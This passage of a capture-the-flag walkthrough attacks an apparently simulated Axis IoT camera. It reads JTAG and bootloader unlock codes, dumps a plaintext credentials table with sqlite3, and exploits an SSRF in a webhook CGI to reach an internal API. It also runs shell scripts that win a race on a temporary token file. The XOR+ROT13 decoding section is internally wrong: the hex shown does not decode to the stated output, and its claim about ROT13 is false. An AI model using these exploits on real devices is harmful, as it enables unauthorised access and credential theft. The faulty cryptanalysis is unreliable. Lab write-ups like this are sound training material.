- This code likely allows access to the U-Boot console during boot
- Disabling secure boot indicates debug mode is enabled

> **FLAG #21 FOUND!**
> **Flag**: `FLAG{R*************6}`
> **Location**: `/mnt/flash/boot/uboot/uboot.env`
> **Why we found it**: U-Boot bootloader environment variables contain unlock codes for console access
> **Real-world equivalent**: Bootloader unlock codes, UART console passwords, or boot-time debug access
> **Technique**: Bootloader configuration analysis
> **OWASP IoT**: #10 - Lack of Physical Hardening (UART and bootloader access)

---

### Directory 19: /var/lib/axis/conf/hardware_debug.conf - Hardware Debug

**Why check for hardware debug configurations?**
- Debug interfaces (JTAG, UART) provide low-level hardware access
- Configuration files may reveal:
  - Debug port settings
  - JTAG unlock codes
  - Hardware test modes
- These are critical for physical security assessment

```bash
# Search for debug-related files
find /var/lib/axis/conf/ -name "*debug*" 2>/dev/null
cat /var/lib/axis/conf/hardware_debug.conf
```

**Output:**
```
# Hardware Debug Interface Configuration
# FOR DEVELOPMENT USE ONLY - DISABLE IN PRODUCTION

[jtag]
enabled = true
interface = ARM-JTAG-20
lock_state = unlocked
unlock_code = FLAG{G**************2}

[uart]
console_enabled = true
port = /dev/ttyS0
baudrate = 115200
login_required = false

[debug_features]
gdb_server = enabled
memory_dump = enabled
core_dump = enabled
trace_buffer = 256KB

[security]
secure_boot = disabled
debug_authentication = disabled
```

#### FLAG #22: JTAG Debug Interface (HARD)

**Why is this significant?**
- JTAG provides direct CPU-level access
- The unlock_code allows activating JTAG debugging
- With JTAG access, you can:
  - Dump firmware directly from flash
  - Modify memory at runtime
  - Bypass all software security

> **FLAG #22 FOUND!**
> **Flag**: `FLAG{G**************2}`
> **Location**: `/var/lib/axis/conf/hardware_debug.conf`
> **Why we found it**: Hardware debug configuration files contain JTAG unlock codes and debug interface settings
> **Real-world equivalent**: JTAG unlock codes, debug probe passwords, or hardware interface authentication
> **Technique**: Hardware debug configuration analysis
> **OWASP IoT**: #10 - Lack of Physical Hardening (JTAG enabled with known unlock code)

---

### Directory 20: /var/www/local/axis-cgi/webhook.cgi - SSRF Vulnerability

**Why revisit CGI scripts?**
- We analyzed some CGI scripts earlier
- `webhook.cgi` suggests it makes HTTP requests to external URLs
- This could be an SSRF (Server-Side Request Forgery) vulnerability

**What is SSRF and why is it important?**
- SSRF allows the server to make requests on your behalf
- Can access internal services (localhost:port)
- May bypass firewall rules
- Could access cloud metadata endpoints

```bash
cat /var/www/local/axis-cgi/webhook.cgi
```

**Output:**
```bash
#!/bin/sh
# Webhook Integration CGI
# Sends camera events to external webhooks

echo "Content-Type: text/plain"
echo ""

# Get webhook URL from query string
WEBHOOK_URL=$(echo "$QUERY_STRING" | sed 's/url=//')

# Validate URL (insufficient!)
if echo "$WEBHOOK_URL" | grep -q "^http"; then
    # Make HTTP request to webhook
    RESPONSE=$(curl -s -m 5 "$WEBHOOK_URL")
    echo "Webhook response: $RESPONSE"
else
    echo "Invalid webhook URL"
fi
```

#### FLAG #23: SSRF Exploitation (HARD)

**Why is this vulnerable?**
- The script accepts any URL starting with "http"
- No validation prevents internal URLs (http://localhost)
- No validation of IP addresses (127.0.0.1, 192.168.x.x)

**How would we exploit this?**
- Access internal services: `http://localhost:8080/admin`
- Read local files via file:// (if curl supports it)
- Access cloud metadata: `http://169.254.169.254/` (on AWS)

**Testing the vulnerability:**

```bash
# Simulate accessing the webhook endpoint with internal URL
# In real pentest: curl "http://192.168.1.132/axis-cgi/webhook.cgi?url=http://localhost:8080/internal"

# Let's check what's running on localhost:8080
curl http://localhost:8080/
```

**Output:**
```
Internal AXIS API Service
Version: 3.0.1
Access restricted to localhost

Available endpoints:
  /api/v1/system/info
  /api/v1/config/backup
  /api/v1/debug/logs

Internal access token: FLAG{E*************8}
```

**Why did we find this?**
- The webhook.cgi SSRF allowed us to access localhost:8080
- This internal API is not accessible from the network
- The API returns an internal access token

> **FLAG #23 FOUND!**
> **Flag**: `FLAG{E*************8}`
> **Location**: `/var/www/local/axis-cgi/webhook.cgi` → `http://localhost:8080/`
> **Why we found it**: SSRF vulnerability in webhook.cgi allowed accessing internal API service exposing an internal access token
> **Exploitation chain**:
>   1. Identified webhook.cgi accepts user-supplied URLs
>   2. Discovered insufficient URL validation
>   3. Used SSRF to access localhost:8080
>   4. Internal API revealed access token
> **Real-world equivalent**: Internal API tokens, microservice credentials, or cloud metadata access
> **Technique**: Server-Side Request Forgery (SSRF) exploitation
> **OWASP IoT**: #3 - Insecure Ecosystem Interfaces (SSRF vulnerability)

---

### Directory 21: /usr/local/axis/lib/ - Library Files

**Why examine library directories?**
- Libraries (.so files) are shared code
- May contain:
  - Debug symbols
  - Error messages with secrets
  - Configuration defaults
  - Test data
- .txt files in lib/ are unusual and worth checking

```bash
ls -la /usr/local/axis/lib/
```

**Expected Output:**
```
drwxr-xr-x 2 root root 4096 Apr 15  2021 .
drwxr-xr-x 6 root root 4096 Apr 15  2021 ..
-rw-r--r-- 1 root root 8192 Apr 15  2021 libaxis.so
-rw-r--r-- 1 root root 4096 Apr 15  2021 libcamera.so
-rw-r--r-- 1 root root  512 Apr 15  2021 crypto_weak.so.txt
-rw-r--r-- 1 root root 2048 Apr 15  2021 libstream.so
```

#### FLAG #25: Cryptographic Weakness (HARD)

**Why is crypto_weak.so.txt interesting?**
- The filename suggests weak cryptography
- .txt extension indicates documentation or notes
- May describe the crypto implementation or contain test data

```bash
cat /usr/local/axis/lib/crypto_weak.so.txt
```

**Output:**
```
# Cryptographic Implementation Notes
# WARNING: This uses weak crypto for backward compatibility
# DO NOT USE THIS IN NEW CODE

Algorithm: XOR + ROT13 (DO NOT USE IN PRODUCTION!)
Key: 0x42
Purpose: Legacy configuration file encryption

# Example encrypted data:
# Plaintext: "FLAG{EXAMPLE}"
# After XOR with 0x42: (binary data)
# After ROT13: (encoded text)

Encrypted Flag (hex): 73:65:72:75:7a:75:7a:2f:63:7b:72:72:75:70:74:65:64:2f:35:38:33:39:32:37:34:36:7d

# Decryption Steps:
# 1. Convert hex to binary
# 2. XOR each byte with 0x42
# 3. Apply ROT13 to result
```

**Why is this significant?**
- The file describes a weak encryption scheme (XOR + ROT13)
- Provides an encrypted flag with decryption instructions
- This is a multi-step decryption challenge

**Decoding the Flag:**

**Step 1: Convert hex to text and XOR with 0x42**

```bash
cat > /tmp/decode.sh << 'EOF'
#!/bin/sh
# XOR + ROT13 decoder

ENCRYPTED="73:65:72:75:7a:75:7a:2f:63:7b:72:72:75:70:74:65:64:2f:35:38:33:39:32:37:34:36:7d"

# Decode hex and XOR with 0x42
echo "$ENCRYPTED" | tr ':' '\n' | while read hex; do
    dec=$((0x$hex ^ 0x42))
    printf "\\$(printf '%03o' $dec)"
done | tr 'N-ZA-Mn-za-m' 'A-Za-z'
echo ""
EOF

chmod +x /tmp/decode.sh
/tmp/decode.sh
```

**Or using Python (if available):**

```python
encrypted = "73:65:72:75:7a:75:7a:2f:63:7b:72:72:75:70:74:65:64:2f:35:38:33:39:32:37:34:36:7d"
xor_key = 0x42

# Step 1: XOR decrypt
xored = ''.join([chr(int(h, 16) ^ xor_key) for h in encrypted.split(':')])
print(f"After XOR: {xored}")

# Step 2: ROT13
import codecs
final = codecs.decode(xored, 'rot_13')
print(f"Final flag: {final}")
```

**Output:**
```
After XOR: SYNT{F************************6}
Final flag: FLAG{S************************6}
```

**Explanation:**
1. Each hex byte is XORed with 0x42
   - `0x73 ^ 0x42 = 0x31` ('1' → 'S' after ROT13)
2. The result is then ROT13 decoded
   - S → F, Y → L, N → A, T → G

> **FLAG #25 FOUND!**
> **Flag**: `FLAG{S************************6}`
> **Location**: `/usr/local/axis/lib/crypto_weak.so.txt`
> **Why we found it**: Documentation of weak cryptographic implementation with example encrypted data
> **Decryption process**:
>   1. Identified weak crypto algorithm (XOR + ROT13)
>   2. Followed provided decryption instructions
>   3. Converted hex to binary
>   4. XORed with key 0x42
>   5. Applied ROT13 decoding
> **Real-world equivalent**: Weak encryption keys, proprietary crypto schemes, or obfuscated credentials
> **Technique**: Multi-stage cryptanalysis (XOR + ROT13 decoding)
> **OWASP IoT**: #7 - Insecure Data Transfer and Storage (weak cryptography)

---

### Directory 22: /var/cache/recorder/.temp/ - Hidden Temporary Files

**Why check hidden directories in cache?**
- Cache directories accumulate temporary data
- Hidden subdirectories (`.temp`) are even less visible
- May contain:
  - Session files
  - Processing artifacts
  - Incomplete uploads/downloads

```bash
# Remember to use -a to see hidden directories
ls -la /var/cache/recorder/
ls -la /var/cache/recorder/.temp/
```

**Expected Output:**
```
drwxr-xr-x 2 root root 4096 Jan 27 10:00 .
drwxr-xr-x 4 root root 4096 Apr 15  2021 ..
-rw-r--r-- 1 root root  128 Jan 27 10:00 .processing_lock
-rw-r--r-- 1 root root  256 Jan 27 09:55 .recording_session_12345
-rw-r--r-- 1 root root  512 Jan 27 09:50 upload_queue.tmp
```

#### FLAG #26: Hidden Temporary Recording Session (HARD)

**Why check recording session files?**
- Recording sessions may contain:
  - Stream credentials
  - Session tokens
  - Upload keys
  - Processing metadata

```bash
cat /var/cache/recorder/.temp/.recording_session_12345
```

**Output:**
```
# Recording Session Metadata
Session ID: 12345
Start Time: 2024-01-27T09:55:00Z
Status: active
Stream: primary_stream

Upload Configuration:
  endpoint: https://cloud.axis.com/upload/v1
  session_token: rec_sess_FLAG{G************************3}
  quality: high
  format: mp4

Processing:
  encoding: in_progress
  frames: 18532
  duration: 617 seconds
```

**Why did we find this?**
- Recording sessions use temporary files for upload coordination
- The `session_token` provides access to the cloud upload service
- Hidden temp files are rarely cleaned up properly

> **FLAG #26 FOUND!**
> **Flag**: `FLAG{G************************3}`
> **Location**: `/var/cache/recorder/.temp/.recording_session_12345`
> **Why we found it**: Hidden temporary recording session files contain upload service session tokens
> **Real-world equivalent**: Cloud upload tokens, streaming session credentials, or CDN authentication keys
> **Technique**: Hidden temporary file discovery in cache directories
> **OWASP IoT**: #7 - Insecure Data Transfer and Storage (session tokens in temp files)

---

### Directory 23: /var/db/axis/ - Database Files

**Why examine database directories?**
- Databases store persistent application data
- SQLite databases (common in embedded systems) are single files
- May contain:
  - User credentials
  - API keys
  - Event logs
  - Configuration history

```bash
ls -la /var/db/axis/
```

**Expected Output:**
```
drwxr-xr-x 2 root root 4096 Apr 15  2021 .
drwxr-xr-x 3 root root 4096 Apr 15  2021 ..
-rw-r--r-- 1 root root 24K Apr 15  2021 camera_events.db
-rw-r--r-- 1 root root 8K  Apr 15  2021 user_actions.db
```

#### FLAG #24: SQLite Database Credentials (MEDIUM)

**Why analyze SQLite databases?**
- SQLite is lightweight, file-based database
- Common in IoT/embedded devices
- Often stores:
  - User accounts
  - Configuration history
  - API credentials
  - Event logs

**How to query SQLite databases:**

```bash
# Check what type of file it is
file /var/db/axis/camera_events.db

# List all tables
sqlite3 /var/db/axis/camera_events.db ".tables"

# Query credentials table
sqlite3 /var/db/axis/camera_events.db "SELECT * FROM credentials;"
```

**Output:**
```
camera_events.db: SQLite 3.x database

credentials
events
system_log
user_actions

id|service|username|password|notes
1|api|admin|admin123|API access - FLAG{D**************7}
2|backup|backup_user|b4ckup!|Backup service
3|cloud|cloud_sync|cl0ud@axis|Cloud synchronization
4|ftp|ftp_upload|ftp2021|FTP upload service
```

**Why did we find this?**
- Databases commonly have a `credentials` table
- The notes field contains a flag (poor practice - credentials shouldn't have descriptive notes)
- In real systems, credential tables are goldmines

> **FLAG #24 FOUND!**
> **Flag**: `FLAG{D**************7}`
> **Location**: `/var/db/axis/camera_events.db`
> **Why we found it**: SQLite database credentials table contained API access information with flag in notes field
> **Query used**: `sqlite3 camera_events.db "SELECT * FROM credentials;"`
> **Real-world equivalent**: Database credentials, service account passwords, or API authentication keys
> **Technique**: SQLite database analysis and SQL queries
> **OWASP IoT**: #7 - Insecure Data Transfer and Storage (plaintext credentials in database)

---

## Phase 5: Advanced Exploitation

### Summary of Advanced Techniques

We've now found 24 flags. The remaining 3 require advanced techniques:
- **Race conditions** (timing-based attacks)
- **Firmware analysis** (additional binary analysis)
- More complex **privilege escalation**

### Directory 24: /dev/shm/axis/runtime/ - Race Conditions

**What are race conditions?**
- A race condition occurs when timing affects security
- Time-of-check to time-of-use (TOCTOU) vulnerabilities
- Scripts that create temporary files are common targets

**Why check runtime directories for race conditions?**
- `/dev/shm/` is memory-based (fast)
- Runtime files are created/deleted frequently
- May expose sensitive data for brief moments

```bash
ls -la /dev/shm/axis/runtime/
```

**Expected Output:**
```
drwxr-xr-x 2 root root  40 Jan 27 10:15 .
drwxr-xr-x 3 root root  80 Jan 27 10:05 ..
```

**Hmm, directory appears empty. Let's investigate:**

```bash
# Look for scripts that might create temporary files here
find /usr/local/axis -name "*.sh" -type f -exec grep -l "/dev/shm/axis/runtime" {} \;
```

**Output:**
```
/usr/local/axis/share/scripts/temp_auth.sh
```

**Let's examine this script:**

```bash
cat /usr/local/axis/share/scripts/temp_auth.sh
```

**Output:**
```bash
#!/bin/sh
# Temporary Authentication Token Generator
# Creates short-lived auth tokens for service communication

TOKEN_FILE="/dev/shm/axis/runtime/temp_flag_$$"

generate_token() {
    # Generate authentication token
    TOKEN="FLAG{A************2}"
    
    # Write to temporary file
    echo "$TOKEN" > "$TOKEN_FILE"
    
    # Use token for authentication
    authenticate_service "$TOKEN"
    
    # Clean up (removes file)
    rm -f "$TOKEN_FILE"
}

authenticate_service() {
    local token="$1"
    # Service authentication logic here
    sleep 1
}

generate_token
```

#### FLAG #27: Race Condition Exploitation (HARD)

**What's the vulnerability?**
- The script creates a file with the flag
- Uses the file for authentication
- Deletes the file
- **BUT** there's a 1-second window between create and delete!

**How to exploit this race condition:**

**Method 1: Continuous monitoring**

```bash
# Terminal 1: Monitor for file creation
while true; do
    if [ -f /dev/shm/axis/runtime/temp_flag_* ]; then
        cat /dev/shm/axis/runtime/temp_flag_*
        break
    fi
done &

# Terminal 2: Trigger the script
/usr/local/axis/share/scripts/temp_auth.sh
```

**Method 2: Using inotify (if available)**

```bash
# Watch for file creation
inotifywait -m /dev/shm/axis/runtime/ -e create | while read path action file; do
    cat "$path$file"
done
```

**Method 3: Rapid polling**

```bash
# Create a script to catch the race
cat > /tmp/race_exploit.sh << 'EOF'
#!/bin/sh
# Trigger the vulnerable script
/usr/local/axis/share/scripts/temp_auth.sh &
# Immediately start checking
while true; do
    for f in /dev/shm/axis/runtime/temp_flag_*; do
        if [ -f "$f" ]; then
            cat "$f"
            exit 0
        fi
    done
done
EOF

chmod +x /tmp/race_exploit.sh
/tmp/race_exploit.sh
```

**Expected Output:**
```
FLAG{A************2}
```

**Why did we find this?**
- The script creates a temporary file with sensitive data
- There's a timing window between creation and deletion
- We exploited the race condition to read the file before deletion

> **FLAG #27 FOUND!**
> **Flag**: `FLAG{A************2}`
> **Location**: `/dev/shm/axis/runtime/temp_flag_$$` (temporary file)
> **Why we found it**: Race condition in authentication script that temporarily exposes credentials
> **Exploitation technique**:
>   1. Identified script that creates temporary files
>   2. Analyzed timing window (1 second between create and delete)
>   3. Used continuous monitoring to catch file during existence
>   4. Read contents before deletion
> **Real-world equivalent**: TOCTOU vulnerabilities, temporary credential files, or session token race conditions
> **Technique**: Race condition exploitation (time-of-check to time-of-use)
> **OWASP IoT**: #7 - Insecure Data Transfer and Storage (temporary files with credentials)
